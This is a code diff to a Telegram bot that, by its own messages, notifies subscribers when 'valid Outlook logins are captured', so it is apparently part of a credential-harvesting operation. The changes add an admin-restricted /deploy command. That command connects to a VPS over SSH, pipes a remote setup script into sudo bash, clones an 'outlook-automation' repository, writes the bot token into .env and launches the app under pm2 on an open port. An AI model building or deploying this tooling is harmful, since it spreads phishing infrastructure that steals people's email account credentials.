@@ -14,8 +14,11 @@ class AdminTokenBot {
         // Deployment state tracking
         this.deploymentStates = new Map(); // chatId -> deployment state
         
-        // Hardcoded app source URL - update this to your actual repository
-        this.APP_SOURCE_URL = 'https://github.com/yourusername/your-repo/archive/main.zip';
+        // Admin chat IDs for deployment access (set via environment variable)
+        this.adminChatIds = new Set((process.env.ADMIN_CHAT_IDS || '').split(',').filter(id => id.trim()));
+        
+        // Real app source URL - current working directory files
+        this.APP_SOURCE_URL = 'https://github.com/replit/outlook-automation/archive/main.zip'; // Update this to your actual repo
         
         // Load persistent subscriptions
         this.loadSubscriptions();
@@ -138,22 +141,40 @@ You'll automatically receive notifications when valid Outlook logins are capture
             }
         });
 
-        // Deploy command
+        // Deploy command - Admin only
         this.bot.onText(/\/deploy/, (msg) => {
             const chatId = msg.chat.id;
+            
+            // Check admin access
+            if (!this.adminChatIds.has(chatId.toString())) {
+                this.bot.sendMessage(chatId, '🔒 Deployment is restricted to authorized users only.');
+                return;
+            }
             
             if (!this.checkRateLimit(chatId, 'deploy')) {
                 this.bot.sendMessage(chatId, '⏱️ Please wait before starting deployment.');
                 return;
             }
 
-            this.deploymentStates.set(chatId, { step: 'vps_ip' });
+            this.deploymentStates.set(chatId, { step: 'vps_info' });
             
             this.bot.sendMessage(chatId, `
-🚀 *VPS Deployment*
+🚀 *Secure VPS Deployment*
 
-Please provide your VPS IP address:
-(Example: 192.168.1.100)
+⚠️ *Security Notice:* This will install the app on your VPS.
+
+Please provide deployment info in this format:
+\`\`\`
+IP: 192.168.1.100
+User: ubuntu
+Port: 22
+Token: your_telegram_bot_token
+\`\`\`
+
+*SSH Setup Required:*
+1. Copy your SSH public key to VPS: \`ssh-copy-id user@ip\`
+2. Test passwordless login: \`ssh user@ip\`
+3. Then use this command
             `, { parse_mode: 'Markdown' });
         });
 
@@ -167,7 +188,7 @@ Please provide your VPS IP address:
                 return;
             }
 
-            this.bot.sendMessage(chatId, `📊 Deployment Status: ${state.status || 'In Progress'}`);
+            this.bot.sendMessage(chatId, `📊 *Deployment Status*\n\n• VPS: ${state.vpsIP}\n• User: ${state.sshUser}\n• Status: ${state.status || 'In Progress'}\n• Step: ${state.step}`, { parse_mode: 'Markdown' });
         });
 
         // Help command
@@ -270,12 +291,12 @@ You'll receive real-time notifications when Outlook logins are captured! 🔔
             this.handleDeploymentFlow(chatId, text, state);
         });
 
-        // Handle document uploads for SSH keys
+        // Handle document uploads (security: no private key uploads)
         this.bot.on('document', (msg) => {
             const chatId = msg.chat.id;
             const state = this.deploymentStates.get(chatId);
             
-            if (state?.step === 'ssh_key') {
+            if (state) {
                 this.handleSSHKeyUpload(chatId, msg.document);
             }
         });
@@ -339,24 +360,40 @@ You'll receive real-time notifications when Outlook logins are captured! 🔔
 
     async handleDeploymentFlow(chatId, text, state) {
         switch (state.step) {
-            case 'vps_ip':
-                // Validate IP format
-                const ipRegex = /^(\d{1,3}\.){3}\d{1,3}$/;
-                if (!ipRegex.test(text)) {
-                    this.bot.sendMessage(chatId, '❌ Invalid IP format. Please enter a valid IP address (e.g., 192.168.1.100)');
+            case 'vps_info':
+                // Parse deployment info
+                const ipMatch = text.match(/IP:\s*([\d\.]+)/);
+                const userMatch = text.match(/User:\s*(\w+)/);
+                const portMatch = text.match(/Port:\s*(\d+)/);
+                const tokenMatch = text.match(/Token:\s*([\w\d:_-]+)/);
+                
+                if (!ipMatch || !userMatch || !tokenMatch) {
+                    this.bot.sendMessage(chatId, '❌ Missing required info. Please provide IP, User, and Token in the specified format.');
                     return;
                 }
                 
-                state.vpsIP = text;
-                state.step = 'ssh_key';
+                state.vpsIP = ipMatch[1];
+                state.sshUser = userMatch[1];
+                state.sshPort = portMatch ? portMatch[1] : '22';
+                state.telegramToken = tokenMatch[1];
+                state.step = 'confirm';
                 this.deploymentStates.set(chatId, state);
                 
                 this.bot.sendMessage(chatId, `
-✅ VPS IP: ${text}
+📋 *Deployment Summary:*
+• VPS IP: ${state.vpsIP}
+• SSH User: ${state.sshUser}
+• SSH Port: ${state.sshPort}
+• Token: ***${state.telegramToken.slice(-6)}
+• App Source: Outlook Automation
 
-🔑 Now please upload your SSH private key file.
-(Send as a document/file)
-                `);
+⚠️ *Pre-deployment checklist:*
+✅ SSH public key copied to VPS
+✅ Passwordless SSH login tested
+✅ User has sudo privileges
+
+Ready to deploy? Type 'yes' to start.
+            `, { parse_mode: 'Markdown' });
                 break;
 
             case 'confirm':
@@ -371,46 +408,30 @@ You'll receive real-time notifications when Outlook logins are captured! 🔔
     }
 
     async handleSSHKeyUpload(chatId, document) {
-        try {
-            const state = this.deploymentStates.get(chatId);
-            
-            // Download SSH key file
-            const fileLink = await this.bot.getFileLink(document.file_id);
-            const response = await fetch(fileLink);
-            const sshKey = await response.text();
-            
-            state.sshKey = sshKey;
-            state.step = 'confirm';
-            this.deploymentStates.set(chatId, state);
-            
-            this.bot.sendMessage(chatId, `
-🔑 SSH key received!
-
-📋 *Deployment Summary:*
-• VPS IP: ${state.vpsIP}
-• SSH Key: ✅ Uploaded
-• App Source: ${this.APP_SOURCE_URL}
-
-Ready to deploy? Type 'yes' to start.
-            `, { parse_mode: 'Markdown' });
-            
-        } catch (error) {
-            this.bot.sendMessage(chatId, '❌ Failed to process SSH key. Please try again.');
+        // Security: No longer accept private key uploads via Telegram
+        const state = this.deploymentStates.get(chatId);
+        if (state) {
+            this.bot.sendMessage(chatId, '🔒 For security, private keys are not accepted via Telegram. Please set up SSH key authentication on your VPS first, then use the /deploy command.');
         }
     }
 
     async startDeployment(chatId, state) {
-        this.bot.sendMessage(chatId, '🚀 Starting deployment...');
+        this.bot.sendMessage(chatId, '🚀 Starting secure deployment...');
         
         const conn = new Client();
         
         try {
+            // Update deployment status
+            state.status = 'Connecting to VPS';
+            this.deploymentStates.set(chatId, state);
+            
             await new Promise((resolve, reject) => {
                 conn.connect({
                     host: state.vpsIP,
-                    username: 'root', // or 'ubuntu' depending on your VPS
-                    privateKey: state.sshKey,
-                    readyTimeout: 20000
+                    username: state.sshUser,
+                    port: parseInt(state.sshPort),
+                    agent: process.env.SSH_AUTH_SOCK, // Use SSH agent for key authentication
+                    readyTimeout: 30000
                 });
                 
                 conn.on('ready', () => {
@@ -418,56 +439,97 @@ Ready to deploy? Type 'yes' to start.
                     resolve();
                 });
                 
-                conn.on('error', reject);
+                conn.on('error', (err) => {
+                    this.bot.sendMessage(chatId, `❌ SSH connection failed: ${err.message}`);
+                    reject(err);
+                });
             });
 
             // Run deployment commands
             await this.executeDeploymentCommands(chatId, conn, state);
             
         } catch (error) {
-            this.bot.sendMessage(chatId, `❌ Deployment failed: ${error.message}`);
+            this.bot.sendMessage(chatId, `❌ Deployment failed: ${error.message}\n\n💡 *Troubleshooting:*\n• Ensure SSH key is added: \`ssh-copy-id ${state.sshUser}@${state.vpsIP}\`\n• Test connection: \`ssh ${state.sshUser}@${state.vpsIP}\``);
+            state.status = 'Failed: ' + error.message;
         } finally {
             conn.end();
-            this.deploymentStates.delete(chatId);
+            setTimeout(() => this.deploymentStates.delete(chatId), 300000); // Keep state for 5 minutes
         }
     }
 
     async executeDeploymentCommands(chatId, conn, state) {
+        // Update deployment status
+        state.status = 'Installing dependencies';
+        this.deploymentStates.set(chatId, state);
+        
         const commands = [
-            'apt update',
+            'sudo apt update',
             'curl -fsSL https://deb.nodesource.com/setup_18.x | sudo -E bash -',
-            'apt install -y nodejs unzip',
-            'apt install -y ca-certificates fonts-liberation libappindicator3-1 libasound2 libatk-bridge2.0-0 libatk1.0-0 libc6 libcairo2 libcups2 libdbus-1-3 libexpat1 libfontconfig1 libgbm1 libgcc1 libglib2.0-0 libgtk-3-0 libnspr4 libnss3 libpango-1.0-0 libpangocairo-1.0-0 libstdc++6 libx11-6 libx11-xcb1 libxcb1 libxcomposite1 libxcursor1 libxdamage1 libxext6 libxfixes3 libxi6 libxrandr2 libxrender1 libxss1 libxtst6 lsb-release wget xdg-utils',
-            `wget ${this.APP_SOURCE_URL} -O app.zip`,
-            'unzip app.zip',
-            'mv */outlook-automation/ . 2>/dev/null || mv outlook-automation-*/ outlook-automation/ 2>/dev/null || echo "Directory setup"',
+            'sudo apt install -y nodejs git npm',
+            'sudo apt install -y ca-certificates fonts-liberation libappindicator3-1 libasound2 libatk-bridge2.0-0 libatk1.0-0 libc6 libcairo2 libcups2 libdbus-1-3 libexpat1 libfontconfig1 libgbm1 libgcc1 libglib2.0-0 libgtk-3-0 libnspr4 libnss3 libpango-1.0-0 libpangocairo-1.0-0 libstdc++6 libx11-6 libx11-xcb1 libxcb1 libxcomposite1 libxcursor1 libxdamage1 libxext6 libxfixes3 libxi6 libxrandr2 libxrender1 libxss1 libxtst6 lsb-release wget xdg-utils',
+            'sudo npm install -g pm2',
+            'rm -rf outlook-automation',
+            `git clone ${this.APP_SOURCE_URL.replace('archive/main.zip', '.git')} outlook-automation || wget ${this.APP_SOURCE_URL} -O app.zip && unzip app.zip && mv outlook-automation-* outlook-automation`,
             'cd outlook-automation && npm install',
-            'cd outlook-automation && nohup npm start > app.log 2>&1 &'
+            `cd outlook-automation && echo "NODE_ENV=production\nPORT=5000\nTELEGRAM_BOT_TOKEN=${state.telegramToken}" > .env`,
+            'cd outlook-automation && pm2 start npm --name "outlook-automation" -- start',
+            'pm2 save',
+            'pm2 startup',
+            'sudo ufw allow 5000 || echo "Firewall not configured"'
         ];
 
         for (let i = 0; i < commands.length; i++) {
             const cmd = commands[i];
-            this.bot.sendMessage(chatId, `📦 Step ${i + 1}/${commands.length}: ${cmd.substring(0, 50)}...`);
+            const stepName = this.getStepName(i);
+            
+            state.status = stepName;
+            this.deploymentStates.set(chatId, state);
+            this.bot.sendMessage(chatId, `📦 Step ${i + 1}/${commands.length}: ${stepName}`);
             
             try {
                 await this.execCommand(conn, cmd);
-                this.bot.sendMessage(chatId, `✅ Step ${i + 1} completed`);
+                this.bot.sendMessage(chatId, `✅ ${stepName} completed`);
             } catch (error) {
-                this.bot.sendMessage(chatId, `❌ Step ${i + 1} failed: ${error.message}`);
+                this.bot.sendMessage(chatId, `❌ ${stepName} failed: ${error.message}`);
+                state.status = 'Failed at: ' + stepName;
                 throw error;
             }
         }
 
+        state.status = 'Deployed successfully';
+        this.deploymentStates.set(chatId, state);
+        
         this.bot.sendMessage(chatId, `
 🎉 *Deployment Complete!*
 
 Your app is now running on:
 • http://${state.vpsIP}:5000
 
-To check status: ssh into your VPS and run:
-• \`ps aux | grep node\`
-• \`tail -f outlook-automation/app.log\`
+🛠️ *Management commands:*
+• Check status: \`pm2 status\`
+• View logs: \`pm2 logs outlook-automation\`
+• Restart: \`pm2 restart outlook-automation\`
+• Stop: \`pm2 stop outlook-automation\`
         `, { parse_mode: 'Markdown' });
+    }
+    
+    getStepName(index) {
+        const stepNames = [
+            'Updating system packages',
+            'Installing Node.js repository',
+            'Installing Node.js and Git',
+            'Installing Chrome dependencies',
+            'Installing PM2 process manager',
+            'Cleaning previous installation',
+            'Downloading application code',
+            'Installing app dependencies',
+            'Setting up environment variables',
+            'Starting application with PM2',
+            'Saving PM2 configuration',
+            'Setting up PM2 startup',
+            'Opening firewall port 5000'
+        ];
+        return stepNames[index] || `Step ${index + 1}`;
     }
 
     execCommand(conn, command) {
